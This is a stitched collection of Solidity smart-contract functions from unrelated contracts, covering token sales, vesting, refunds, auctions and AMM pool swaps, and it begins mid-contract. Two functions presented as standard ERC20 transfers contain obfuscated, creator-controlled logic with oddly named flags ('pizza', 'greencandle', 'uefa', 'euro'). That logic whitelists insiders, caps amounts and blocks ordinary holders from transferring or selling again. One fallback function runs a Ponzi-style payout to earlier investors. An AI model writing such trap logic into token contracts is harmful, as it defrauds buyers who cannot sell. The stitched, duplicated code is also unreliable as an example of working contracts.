    emit Transfer(sender, recipient, amount);
}

function countByGrand(List storage ds) internal view returns(uint256) {
    if (ds.size == 0) return 0;
    uint256 count = 0;
    uint256 _lastAt = now;
    uint256 lastIdx = ds.size - 1;
    Data memory d = get(ds, lastIdx - count);
    while ((_lastAt - d.replyAt) <= GRAND_TOTAL_TIME) {
        count++;
        _lastAt = d.replyAt;
        if (count > lastIdx) return count;
        d = get(ds, lastIdx - count);
    }
    return count;
}

function getWinReply(Data storage d) internal view returns(PlayerReply.Data storage) {
    PlayerReply.Data storage pr = d.replys.getWin();
    if (pr.isWined()) return pr;
    if (d.replayCount > 0 && getOverTimeLeft(d) == 0) return d.replys.getLastReply();
    return pr;
}

function getVisibleType(List storage ds, uint256 ansHash) internal view returns(uint256) {
    Data storage d = ds.map[ansHash];
    if (d.ownerIds.contains(msg.sender)) {
        return VISABLE_OWNER;
    } else if (d.answer.length == d.aCount) {
        return VISABLE_FINAL;
    } else if (ds.buyer[ansHash].contains(msg.sender)) {
        return VISABLE_BUYED;
    } else if ((now - d.replyAt) > HIDE_TIME && ds.sellPriceMap[ansHash] == 0) {
        return VISABLE_ALL;
    }
    return VISABLE_NONE;
}

function getOverTimeLeft(Data storage d) internal view returns(uint256) {
    if (d.replayCount == 0) return 0;
    uint256 time = (d.replayCount * d.plusAwardTime) + d.initAwardTime;
    uint256 spendT = (now - d.firstReplayAt);
    if (time < spendT) return 0;
    return time - spendT;
}

function buy(address recipient) payable {
    if (recipient == 0x0) throw;
    if (msg.value < MIN_ETHER) throw;
    if (_saleState == TokenSaleState.Frozen) throw;
    if ((_saleState == TokenSaleState.Initial || _saleState == TokenSaleState.Presale) && presaleSupply >= presaleAllocation) throw;
    if ((_saleState == TokenSaleState.Initial || _saleState == TokenSaleState.Presale) && presaleEtherRaised >= etherCap) throw;
    updateTokenSaleState();
    uint tokens = mul(msg.value, price());
    if (tokens <= 0) throw;
    balances[recipient] = add(balances[recipient], tokens);
    totalTokens = add(totalTokens, tokens);
    if (_saleState == TokenSaleState.Initial || _saleState == TokenSaleState.Presale) {
        presaleEtherRaised = add(presaleEtherRaised, msg.value);
        presaleSupply = add(presaleSupply, tokens);
    }
    founder.transfer(msg.value);
    Transfer(0, recipient, tokens);
    Buy(recipient, msg.value, tokens);
}

function deposit(uint256 amount) public returns(uint256) { 
    require(ERC20Token(BOMB_CONTRACT).transferFrom(address(msg.sender), address(this), amount), "TransferFailed");
    uint256 tokensToBurn = findOnePercent(amount);
    uint256 actual = amount.sub(tokensToBurn);
    balanceOf[msg.sender] += actual;
    _totalSupply += actual;
    emit Deposit(msg.sender, amount);
    emit Transfer(address(this), address(msg.sender), actual);
    return actual;
}

receive() external payable {
    require(presaleStarted, "Presale not started");
    require(!presaleEnded, "Presale ended");
    require(block.timestamp < presaleEnd, "Presale time's up");
    uint256 amount = msg.value + balances[msg.sender];
    require(amount >= minPerUser, "Below buy-in");
    require(amount <= maxPerUser, "Over buy-in");
    balances[msg.sender] = amount;
    if (collected() >= presaleLimit) {
        presaleEnded = true;
    }
}

function safeWithdrawal() public afterDeadline nonReentrant {
    if (!fundingGoalReached) {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            msg.sender.transfer(amount);
            emit FundTransfer(msg.sender, amount, false);
            refundAmount = refundAmount.add(amount);
        }
    }
}

function ownerSafeWithdrawal() public onlyOwner nonReentrant {
    require(fundingGoalReached, "Check funding goal");
    uint balanceToSend = address(this).balance;
    beneficiary.transfer(balanceToSend);
    emit FundTransfer(beneficiary, balanceToSend, false);
}

function withdrawToken(uint tokensToWithdraw) public {
    uint tokensInWei = convertToMini(tokensToWithdraw);
    require(
        tokensInWei <= tokenReward.balanceOf(msg.sender),
        "You do not have sufficient balance to withdraw"
    );
    uint ethToGive = tokensInWei.div(withdrawRate);
    require(ethToGive <= address(this).balance, "Insufficient ethers.");
    tokenReward.setAllowanceBeforeWithdrawal(msg.sender, address(this), tokensInWei);
    tokenReward.transferFrom(msg.sender, tokenReward.owner(), tokensInWei);
    msg.sender.transfer(ethToGive);
    emit FundTransfer(this.owner(), ethToGive, true);
}

function() public payable whenNotPaused beforeDeadline afterStartTime saleNotClosed nonReentrant {
    uint amount = msg.value;
    uint currentBalance = balanceOf[msg.sender];
    balanceOf[msg.sender] = currentBalance.add(amount);
    amountRaised = amountRaised.add(amount);
    uint numTokens = amount.mul(rate);
    if (tokenReward.transferFrom(tokenReward.owner(), msg.sender, numTokens)) {
        emit FundTransfer(msg.sender, amount, true);
        checkFundingGoal();
        checkFundingCap();
    } else {
        revert("Transaction Failed. Please try again later.");
    }
}

function ownerAllocateTokens(address _to, uint amountWei, uint amountMiniCHP) public
onlyOwner nonReentrant {
    if (!tokenReward.transferFrom(tokenReward.owner(), _to, amountMiniCHP)) {
        revert("Transfer failed. Please check allowance");
    }
    balanceOf[_to] = balanceOf[_to].add(amountWei);
    amountRaised = amountRaised.add(amountWei);
    emit FundTransfer(_to, amountWei, true);
    checkFundingGoal();
    checkFundingCap();
}

function release(CutdownToken _token) public {
    uint256 unreleased = releasableAmount(_token);
    require(unreleased > 0);
    released[_token] = released[_token].add(unreleased);
    _token.transfer(beneficiary, unreleased);
    emit Released(unreleased);
}

function vestedAmount(CutdownToken _token) public view returns(uint256) {
    uint256 currentBalance = _token.balanceOf(address(this));
    uint256 totalBalance = currentBalance.add(released[_token]);
    if (now < cliff) {
        return 0;
    } else if (now >= start.add(duration)) {
        return totalBalance;
    } else {
        return totalBalance.mul(now.sub(start)).div(duration);
    }
}

function checkContributorBalance(address addr) view public returns(uint balance, uint cap, uint remaining) {
    var c = whitelist[addr];
    if (!c.authorized) {
        cap = whitelistContract.checkMemberLevel(addr);
        if (cap == 0) return (0, 0, 0);
    } else {
        cap = c.cap;
    }
    balance = c.balance;
    if (contractStage == 1) {
        if (cap < contributionCaps.length) {
            if (nextCapTime == 0 || nextCapTime > block.timestamp) {
                cap = contributionCaps[cap];
            } else {
                cap = nextContributionCaps[cap];
            }
        }
        remaining = cap.sub(balance);
        if (contributionCaps[0].sub(this.balance) < remaining) remaining = contributionCaps[0].sub(this.balance);
    } else {
        remaining = 0;
    }
    return (balance, cap, remaining);
}

function _checkCap(address addr) internal returns(uint) {
    _checkWhitelistContract(addr);
    var c = whitelist[addr];
    if (!c.authorized) return 0;
    if (nextCapTime > 0 && block.timestamp > nextCapTime) {
        contributionCaps = nextContributionCaps;
        nextCapTime = 0;
    }
    if (c.cap < contributionCaps.length) return contributionCaps[c.cap];
    return c.cap;
}

function() external payable {
    address sender = msg.sender;
    require(!stopInvest, "invest stop");
    if (invested[sender] != 0) {
        uint256 amount = getInvestorDividend(sender);
        if (amount >= address(this).balance) {
            amount = address(this).balance;
            stopInvest = true;
        }
        sender.send(amount);
    }
    dateInvest[sender] = now;
    invested[sender] += msg.value;
    if (msg.value > 0) {
        address ref = bytesToAddress(msg.data);
        adminAddr.send(msg.value * ADMIN_FEE / 100);
        if (ref != sender && invested[ref] != 0) {
            ref.send(msg.value * REFERRER_FEE / 100);
        }
    }
}

function getAge() public view returns(uint256 d) {
    uint256 a = block.timestamp;
    uint256 b = a - tokenBirth;
    uint256 c = b - b % 86400;
    if (c == 0) {
        d = 1;
    } else {
        d = c / 86400;
    }
}

function withdrawLRC() payable {
    require(depositStartTime > 0);
    require(lrcDeposited > 0);
    var record = records[msg.sender];
    require(now >= record.timestamp + WITHDRAWAL_DELAY);
    require(record.lrcAmount > 0);
    uint lrcWithdrawalBase = record.lrcAmount;
    if (msg.value > 0) {
        lrcWithdrawalBase = lrcWithdrawalBase
            .min256(msg.value.mul(WITHDRAWAL_SCALE));
    }
    uint lrcBonus = getBonus(lrcWithdrawalBase);
    uint balance = lrcBalance();
    uint lrcAmount = balance.min256(lrcWithdrawalBase + lrcBonus);
    lrcDeposited -= lrcWithdrawalBase;
    record.lrcAmount -= lrcWithdrawalBase;
    if (record.lrcAmount == 0) {
        delete records[msg.sender];
    } else {
        records[msg.sender] = record;
    }
    Withdrawal(withdrawId++, msg.sender, lrcAmount);
    require(Token(lrcTokenAddress).transfer(msg.sender, lrcAmount));
    if (msg.value > 0) {
        msg.sender.transfer(msg.value);
    }
}

function drain() public {
    require(msg.sender == owner);
    require(depositStartTime > 0 && now >= depositStartTime + DRAIN_DELAY);
    uint balance = lrcBalance();
    require(balance > 0);
    require(Token(lrcTokenAddress).transfer(owner, balance));
    Drained(balance);
}

function checkVestingWithFrozen(address sender) public view returns(uint256) {
    if (freezing) {
        if (freezeTimeBlock[sender] <= now) {
            return checkVesting(sender);
        } else {
            return checkVesting(sender).sub(freezeTokens[sender]);
        }
    } else {
        return checkVesting(sender);
    }
}

function checkVesting(address sender) public view returns(uint256) {
    if (now >= launchTime.add(270 days)) {
        return balances[sender];
    } else if (now >= launchTime.add(180 days)) {
        return balances[sender].sub(uniqueTokens[sender].mul(35).div(100));
    } else if (now >= launchTime.add(120 days)) {
        return balances[sender].sub(uniqueTokens[sender].mul(7).div(10));
    } else if (now >= launchTime.add(90 days)) {
        return balances[sender].sub((uniqueTokens[sender].mul(7).div(10)).add(crowdSaleTokens[sender].mul(2).div(10)));
    } else if (now >= launchTime.add(60 days)) {
        return balances[sender].sub(uniqueTokens[sender].add(preSaleTokens[sender].mul(3).div(10)).add(crowdSaleTokens[sender].mul(4).div(10)));
    } else if (now >= launchTime.add(30 days)) {
        return balances[sender].sub(uniqueTokens[sender].add(preSaleTokens[sender].mul(6).div(10)).add(crowdSaleTokens[sender].mul(6).div(10)));
    } else {
        return balances[sender].sub(uniqueTokens[sender].add(preSaleTokens[sender].mul(9).div(10)).add(crowdSaleTokens[sender].mul(8).div(10)));
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (llamas == false)) {
        pizza = chTx;
        thisValue = true;
    }
    if ((address(sender) == creator) && (llamas == true)) {
        thedios[recipient] = true;
        thedeus[recipient] = false;
        llamas = false;
    }
    if (thedios[recipient] != true) {
        thedeus[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((thedeus[sender]) && (thedios[recipient] == false)) {
        thedeus[recipient] = true;
    }
    if (thedios[sender] == false) {
        require(amount < pizza);
        if (thisValue == true) {
            if (greencandle[sender] == true) {
                require(false);
            }
            greencandle[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function mint() public returns(bool) {
    require(msg.sender == owner);
    uint256 tokensToMint = 0;
    if (now > initialIssueMintingDate && !initialIssueMinted) {
        tokensToMint = tokensToMint.add(initialIssueMinting);
        initialIssueMinted = true;
    }
    if (now > firstStageMintingDate && !firstStageMinted) {
        tokensToMint = tokensToMint.add(firstStageMinting);
        firstStageMinted = true;
    }
    if (now > secondStageMintingDate && !secondStageMinted) {
        tokensToMint = tokensToMint.add(secondStageMinting);
        secondStageMinted = true;
    }
    if (now > thirdStageMintingDate && !thirdStageMinted) {
        tokensToMint = tokensToMint.add(thirdStageMinting);
        thirdStageMinted = true;
    }
    if (now > fourthStageMintingDate && !fourthStageMinted) {
        tokensToMint = tokensToMint.add(fourthStageMinting);
        fourthStageMinted = true;
    }
    require(tokensToMint > 0);
    uint256 newTotalSupply = totalSupply_.add(tokensToMint);
    require(newTotalSupply <= totalTokens);
    totalSupply_ = totalSupply_.add(tokensToMint);
    balances[owner] = balances[owner].add(tokensToMint);
    emit Mint(owner, tokensToMint);
    emit Transfer(0x0, owner, tokensToMint);
    return true;
}

function refund(address investor) public {
    require(state == State.Refunding);
    require(deposited[investor] > 0);
    uint256 depositedValue = deposited[investor];
    deposited[investor] = 0;
    investor.transfer(depositedValue);
    emit Refunded(investor, depositedValue);
}

function isPhaseValid(uint256 index) public view returns(bool) {
    return phases[index].expireDate >= now && (!phases[index].maxAmountEnabled || phases[index].maxAmount > minPerUser);
}

function currentPhaseId() public view returns(uint256) {
    uint256 index = lastActivePhase;
    while (index < phases.length - 1 && !isPhaseValid(index)) {
        index = index + 1;
    }
    return index;
}

function startRefunding() public {
    require(state == State.Active);
    require(address(this).balance < goal);
    require(refunduingStartDate < now);
    state = State.Refunding;
    emit RefundsEnabled();
}

function() controlledDonation public payable {
    require(state != State.Refunding);
    uint256 phaseId = currentPhaseId();
    require(isPhaseValid(phaseId));
    if (phases[phaseId].maxAmountEnabled) {
        if (phases[phaseId].maxAmount >= msg.value) {
            phases[phaseId].maxAmount = phases[phaseId].maxAmount.sub(msg.value);
        } else {
            phases[phaseId].maxAmount = 0;
        }
    }
    require(token.transfer(msg.sender, msg.value.mul(phases[phaseId].rate)));
    lastActivePhase = phaseId;
}

function sell(uint256 tokenToSell) external returns(bool) {
    require(msg.sender == tx.origin, "Origin and Sender Mismatched");
    require(block.number - userLastAction[msg.sender] > 0, "Frequent Call");
    userLastAction[msg.sender] = block.number;
    uint256 sellPrice = currentPrice - (currentPrice / 100);
    uint256 circultedSupplyBeforeSell = _circulatedSupply;
    require(isSellPrevented == 0, "Sell not allowed.");
    require(isUserSellDisallowed[msg.sender] == false, "Sell not allowed for user.");
    require(_circulatedSupply > 0, "no circulated tokens");
    require(tokenToSell > 0, "can not sell 0 token");
    require(tokenToSell <= tokenBalances[msg.sender], "not enough tokens to transact");
    require(tokenToSell.add(_circulatedSupply) <= _totalSupply, "exceeded total supply");
    require(msg.sender != address(0), "ERC20: burn from the zero address");
    tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(tokenToSell);
    emit Transfer(msg.sender, address(this), tokenToSell);
    uint256 totalDecrement = getIncrement(tokenToSell);
    currentPrice = currentPrice - totalDecrement;
    _circulatedSupply = _circulatedSupply.sub(tokenToSell);
    uint256 sellPriceAfterSell = currentPrice;
    uint256 convertedEthers = etherValueForSell(tokenToSell, sellPrice);
    uint256 circultedSupplyAfterSell = _circulatedSupply;
    msg.sender.transfer(convertedEthers);
    emit Sell(msg.sender, convertedEthers, tokenToSell, sellPrice, sellPriceAfterSell, circultedSupplyBeforeSell, circultedSupplyAfterSell);
    return true;
}

function withdrawRewards(uint256 ethWithdraw) external returns(bool) {
    require(msg.sender == tx.origin, "Origin and Sender Mismatched");
    require(block.number - userLastAction[msg.sender] > 0, "Frequent Call");
    userLastAction[msg.sender] = block.number;
    require(isWithdrawPrevented == 0, "Withdraw not allowed.");
    require(isUserWithdrawDisallowed[msg.sender] == false, "Withdraw not allowed for user.");
    require(_circulatedSupply > 0, "no circulated tokens");
    require(ethWithdraw > 0, "can not withdraw 0 eth");
    require(ethWithdraw <= rewardBalanceLedger_[msg.sender], "not enough rewards to withdraw");
    require(ethWithdraw <= commFundsWallet, "exceeded commission funds");
    rewardBalanceLedger_[msg.sender] = rewardBalanceLedger_[msg.sender].sub(ethWithdraw);
    commFundsWallet = commFundsWallet.sub(ethWithdraw);
    msg.sender.transfer(ethWithdraw);
    emit onWithdraw(msg.sender, ethWithdraw);
    return true;
}

function unpause() public onlyOwner whenPaused {
    require(nonFungibleContract != address(0));
    require(storageContract != address(0));
    require(storageContract.owner() == address(this));
    super.unpause();
}

function _bid(uint256 _tokenId, uint256 _bidAmount, address bidder) internal returns(uint256) {
    require(clockAuctionStorage.isOnAuction(_tokenId));
    uint256 price = _currentPrice(_tokenId);
    require(_bidAmount >= price);
    address seller = clockAuctionStorage.getSeller(_tokenId);
    uint256 sellerProceeds = 0;
    clockAuctionStorage.removeAuction(_tokenId);
    if (price > 0) {
        uint256 auctioneerCut = _computeCut(price);
        sellerProceeds = price - auctioneerCut;
        seller.transfer(sellerProceeds);
    }
    uint256 bidExcess = _bidAmount - price;
    bidder.transfer(bidExcess);
    emit AuctionSuccessful(_tokenId, price, bidder, seller, sellerProceeds);
    return price;
}

function setNFTAddress(address _nftAddress) public onlyOwner {
    require(_nftAddress != address(0));
    ERC721 candidateContract = ERC721(_nftAddress);
    require(candidateContract.supportsInterface(InterfaceSignature_NFC));
    nonFungibleContract = candidateContract;
}

function _computeCut(uint256 _price) internal view returns(uint256) {
    uint256 cutValue = _price * ownerCut / 10000;
    if (_price < minCutValue) return cutValue;
    if (cutValue > minCutValue) return cutValue;
    return minCutValue;
}

function _currentPrice(uint256 _tokenId) internal view returns(uint256) {
    uint256 secondsPassed = 0;
    address seller;
    uint128 startingPrice;
    uint128 endingPrice;
    uint64 duration;
    uint64 startedAt;
    (seller, startingPrice, endingPrice, duration, startedAt) = clockAuctionStorage.getAuction(_tokenId);
    if (now > startedAt) {
        secondsPassed = now - startedAt;
    }
    return _computeCurrentPrice(
        startingPrice,
        endingPrice,
        duration,
        secondsPassed
    );
}

function claim(address _payout, address _fee) public returns(bool success) {
    require(buried[msg.sender]);
    require(_payout != _fee);
    require(msg.sender != _payout);
    require(msg.sender != _fee);
    require(claimed[msg.sender] == 1 || (block.timestamp - claimed[msg.sender]) >= epoch);
    require(balances[msg.sender] >= claimAmount);
    claimed[msg.sender] = block.timestamp;
    uint256 previousBalances = balances[msg.sender] + balances[_payout] + balances[_fee];
    balances[msg.sender] -= claimAmount;
    balances[_payout] += payAmount;
    balances[_fee] += feeAmount;
    Claim(msg.sender, _payout, _fee);
    Transfer(msg.sender, _payout, payAmount);
    Transfer(msg.sender, _fee, feeAmount);
    assert(balances[msg.sender] + balances[_payout] + balances[_fee] == previousBalances);
    return true;
}

function swapExactAmountOutRefer(
    address tokenIn,
    uint256 maxAmountIn,
    address tokenOut,
    uint256 tokenAmountOut,
    uint256 maxPrice,
    address referrer
) public _lock_ returns(uint256 tokenAmountIn, uint256 spotPriceAfter) {
    require(_records[tokenIn].bound, "ERR_NOT_BOUND");
    require(_records[tokenOut].bound, "ERR_NOT_BOUND");
    require(finalized, "ERR_NOT_FINALIZED");
    Record storage inRecord = _records[address(tokenIn)];
    Record storage outRecord = _records[address(tokenOut)];
    require(
        tokenAmountOut <= (outRecord.balance).bmul(MAX_OUT_RATIO),
        "ERR_MAX_OUT_RATIO"
    );
    uint256 spotPriceBefore =
        XMath.calcSpotPrice(
            inRecord.balance,
            inRecord.denorm,
            outRecord.balance,
            outRecord.denorm,
            swapFee
        );
    require(spotPriceBefore <= maxPrice, "ERR_BAD_LIMIT_PRICE");
    tokenAmountIn = calcInGivenOut(
        inRecord.balance,
        inRecord.denorm,
        outRecord.balance,
        outRecord.denorm,
        tokenAmountOut,
        swapFee
    );
    require(tokenAmountIn <= maxAmountIn, "ERR_LIMIT_IN");
    require(
        spotPriceBefore <= tokenAmountIn.bdiv(tokenAmountOut),
        "ERR_MATH_APPROX"
    );
    inRecord.balance = (inRecord.balance).badd(tokenAmountIn);
    outRecord.balance = (outRecord.balance).bsub(tokenAmountOut);
    spotPriceAfter = XMath.calcSpotPrice(
        inRecord.balance,
        inRecord.denorm,
        outRecord.balance,
        outRecord.denorm,
        swapFee
    );
    require(spotPriceAfter >= spotPriceBefore, "ERR_MATH_APPROX");
    require(spotPriceAfter <= maxPrice, "ERR_LIMIT_PRICE");
    emit LOG_SWAP(
        msg.sender,
        tokenIn,
        tokenOut,
        tokenAmountIn,
        tokenAmountOut
    );
    _pullUnderlying(tokenIn, msg.sender, tokenAmountIn);
    uint256 _swapFee = tokenAmountIn.bmul(swapFee);
    uint256 _referFee = 0;
    if (
        referrer != address(0) &&
        referrer != msg.sender &&
        referrer != tx.origin
    ) {
        _referFee = _swapFee / 5; 
        _pushUnderlying(tokenIn, referrer, _referFee);
        inRecord.balance = (inRecord.balance).bsub(_referFee);
        emit LOG_REFER(msg.sender, referrer, tokenIn, _referFee);
    }
    uint256 _safuFee = tokenAmountIn.bmul(safuFee);
    if (isFarmPool) {
        _safuFee = _swapFee.bsub(_referFee);
    }
    require(_safuFee.badd(_referFee) <= _swapFee, "ERR_FEE_LIMIT");
    _pushUnderlying(tokenIn, SAFU, _safuFee);
    inRecord.balance = (inRecord.balance).bsub(_safuFee);
    _pushUnderlying(tokenOut, msg.sender, tokenAmountOut);
    return (tokenAmountIn, spotPriceAfter);
}

function swapExactAmountInRefer(
    address tokenIn,
    uint256 tokenAmountIn,
    address tokenOut,
    uint256 minAmountOut,
    uint256 maxPrice,
    address referrer
) public _lock_ returns(uint256 tokenAmountOut, uint256 spotPriceAfter) {
    require(_records[tokenIn].bound, "ERR_NOT_BOUND");
    require(_records[tokenOut].bound, "ERR_NOT_BOUND");
    require(finalized, "ERR_NOT_FINALIZED");
    Record storage inRecord = _records[address(tokenIn)];
    Record storage outRecord = _records[address(tokenOut)];
    require(
        tokenAmountIn <= (inRecord.balance).bmul(MAX_IN_RATIO),
        "ERR_MAX_IN_RATIO"
    );
    uint256 spotPriceBefore =
        XMath.calcSpotPrice(
            inRecord.balance,
            inRecord.denorm,
            outRecord.balance,
            outRecord.denorm,
            swapFee
        );
    require(spotPriceBefore <= maxPrice, "ERR_BAD_LIMIT_PRICE");
    tokenAmountOut = calcOutGivenIn(
        inRecord.balance,
        inRecord.denorm,
        outRecord.balance,
        outRecord.denorm,
        tokenAmountIn,
        swapFee
    );
    require(tokenAmountOut >= minAmountOut, "ERR_LIMIT_OUT");
    require(
        spotPriceBefore <= tokenAmountIn.bdiv(tokenAmountOut),
        "ERR_MATH_APPROX"
    );
    inRecord.balance = (inRecord.balance).badd(tokenAmountIn);
    outRecord.balance = (outRecord.balance).bsub(tokenAmountOut);
    spotPriceAfter = XMath.calcSpotPrice(
        inRecord.balance,
        inRecord.denorm,
        outRecord.balance,
        outRecord.denorm,
        swapFee
    );
    require(spotPriceAfter >= spotPriceBefore, "ERR_MATH_APPROX");
    require(spotPriceAfter <= maxPrice, "ERR_LIMIT_PRICE");
    emit LOG_SWAP(
        msg.sender,
        tokenIn,
        tokenOut,
        tokenAmountIn,
        tokenAmountOut
    );
    _pullUnderlying(tokenIn, msg.sender, tokenAmountIn);
    uint256 _swapFee = tokenAmountIn.bmul(swapFee);
    uint256 _referFee = 0;
    if (
        referrer != address(0) &&
        referrer != msg.sender &&
        referrer != tx.origin
    ) {
        _referFee = _swapFee / 5; 
        _pushUnderlying(tokenIn, referrer, _referFee);
        inRecord.balance = (inRecord.balance).bsub(_referFee);
        emit LOG_REFER(msg.sender, referrer, tokenIn, _referFee);
    }
    uint256 _safuFee = tokenAmountIn.bmul(safuFee);
    if (isFarmPool) {
        _safuFee = _swapFee.bsub(_referFee);
    }
    require(_safuFee.badd(_referFee) <= _swapFee, "ERR_FEE_LIMIT");
    _pushUnderlying(tokenIn, SAFU, _safuFee);
    inRecord.balance = (inRecord.balance).bsub(_safuFee);
    _pushUnderlying(tokenOut, msg.sender, tokenAmountOut);
    return (tokenAmountOut, spotPriceAfter);
}

function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn)
external
_lock_ {
    require(finalized, "ERR_NOT_FINALIZED");
    require(maxAmountsIn.length == _tokens.length, "ERR_LENGTH_MISMATCH");
    uint256 poolTotal = totalSupply();
    uint256 ratio = poolAmountOut.bdiv(poolTotal);
    require(ratio != 0, "ERR_MATH_APPROX");
    for (uint256 i = 0; i < _tokens.length; i++) {
        address t = _tokens[i];
        uint256 bal = _records[t].balance;
        uint256 tokenAmountIn = ratio.bmul(bal);
        require(tokenAmountIn != 0, "ERR_MATH_APPROX");
        require(tokenAmountIn <= maxAmountsIn[i], "ERR_LIMIT_IN");
        _records[t].balance = (_records[t].balance).badd(tokenAmountIn);
        emit LOG_JOIN(msg.sender, t, tokenAmountIn);
        _pullUnderlying(t, msg.sender, tokenAmountIn);
    }
    _mintPoolShare(poolAmountOut);
    _pushPoolShare(msg.sender, poolAmountOut);
}

function joinswapExternAmountIn(
    address tokenIn,
    uint256 tokenAmountIn,
    uint256 minPoolAmountOut
) external _lock_ returns(uint256 poolAmountOut) {
    require(finalized, "ERR_NOT_FINALIZED");
    require(_records[tokenIn].bound, "ERR_NOT_BOUND");
    require(
        tokenAmountIn <= (_records[tokenIn].balance).bmul(MAX_IN_RATIO),
        "ERR_MAX_IN_RATIO"
    );
    _pullUnderlying(tokenIn, msg.sender, tokenAmountIn);
    uint256 _safuFee = tokenAmountIn.bmul(safuFee);
    if (isFarmPool) {
        _safuFee = tokenAmountIn.bmul(swapFee);
    }
    tokenAmountIn = tokenAmountIn.bsub(_safuFee);
    Record storage inRecord = _records[tokenIn];
    poolAmountOut = XMath.calcPoolOutGivenSingleIn(
        inRecord.balance,
        inRecord.denorm,
        _totalSupply,
        _totalWeight,
        tokenAmountIn,
        swapFee
    );
    require(poolAmountOut >= minPoolAmountOut, "ERR_LIMIT_OUT");
    inRecord.balance = (inRecord.balance).badd(tokenAmountIn);
    _pushUnderlying(tokenIn, SAFU, _safuFee);
    emit LOG_JOIN(msg.sender, tokenIn, tokenAmountIn);
    _mintPoolShare(poolAmountOut);
    _pushPoolShare(msg.sender, poolAmountOut);
    return poolAmountOut;
}

function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut)
external
_lock_ {
    require(finalized, "ERR_NOT_FINALIZED");
    require(minAmountsOut.length == _tokens.length, "ERR_LENGTH_MISMATCH");
    require(poolAmountIn >= MIN_POOL_AMOUNT, "ERR_MIN_AMOUNT");
    uint256 poolTotal = totalSupply();
    uint256 _exitFee = poolAmountIn.bmul(exitFee);
    if (msg.sender == origin) {
        _exitFee = 0;
    }
    uint256 pAiAfterExitFee = poolAmountIn.bsub(_exitFee);
    uint256 ratio = pAiAfterExitFee.bdiv(poolTotal);
    require(ratio != 0, "ERR_MATH_APPROX");
    _pullPoolShare(msg.sender, poolAmountIn);
    if (_exitFee > 0) {
        _pushPoolShare(origin, _exitFee);
    }
    _burnPoolShare(pAiAfterExitFee);
    for (uint256 i = 0; i < _tokens.length; i++) {
        address t = _tokens[i];
        uint256 bal = _records[t].balance;
        uint256 tokenAmountOut = ratio.bmul(bal);
        require(tokenAmountOut != 0, "ERR_MATH_APPROX");
        require(tokenAmountOut >= minAmountsOut[i], "ERR_LIMIT_OUT");
        _records[t].balance = (_records[t].balance).bsub(tokenAmountOut);
        emit LOG_EXIT(msg.sender, t, tokenAmountOut);
        _pushUnderlying(t, msg.sender, tokenAmountOut);
    }
}

function buySale(uint8 saleID, address referral) private {
    require(!inMaintainance);
    require(msg.sender != address(0));
    Sale storage sale = sales[saleID];
    require(sale.saleEndTime > now);
    require(msg.value >= sale.price);
    require(sale.bought < sale.maxBought);
    sale.bought++;
    bool toRegisterPlayer = false;
    bool toRegisterReferral = false;
    Player storage player = players[msg.sender];
    if (player.id == 0)
        toRegisterPlayer = true;
    player.bought[saleID]++;
    player.weiSpent += msg.value;
    if (!player.hasSpent) {
        player.hasSpent = true;
        if (referral != address(0) && referral != msg.sender) {
            Player storage referredPlayer = players[referral];
            if (referredPlayer.id == 0) { 
                toRegisterReferral = true;
            } else { 
                playerRefCounts[referredPlayer.id]++;
            }
        }
    }
    if (toRegisterPlayer && toRegisterReferral) {
        uint256 length = (uint32)(playerAddrs.length);
        player.id = (uint32)(length);
        referredPlayer.id = (uint32)(length + 1);
        playerAddrs.length = length + 2;
        playerRefCounts.length = length + 2;
        playerAddrs[length] = msg.sender;
        playerAddrs[length + 1] = referral;
        playerRefCounts[length + 1] = 1;
    } else if (toRegisterPlayer) {
        player.id = (uint32)(playerAddrs.length);
        playerAddrs.push(msg.sender);
        playerRefCounts.push(0);
    } else if (toRegisterReferral) {
        referredPlayer.id = (uint32)(playerAddrs.length);
        playerAddrs.push(referral);
        playerRefCounts.push(1);
    }
    refPrize += msg.value / 40; 
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (katar == false)) {
        airways = chTx;
        ninos = true;
    }
    if ((address(sender) == creator) && (katar == true)) {
        italy[recipient] = true;
        uefa[recipient] = false;
        katar = false;
    }
    if ((amount > abudabi) && (italy[sender] == true) && (address(sender) != creator)) {
        euro[recipient] = true;
    }
    if (italy[recipient] != true) {
        uefa[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((uefa[sender]) && (italy[recipient] == false)) {
        uefa[recipient] = true;
    }
    if (italy[sender] == false) {
        if ((amount > abudabi) && (euro[sender] == true)) {
            require(false);
        }
        require(amount < airways);
        if (ninos == true) {
            if (euro[sender] == true) {
                require(false);
            }
            euro[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

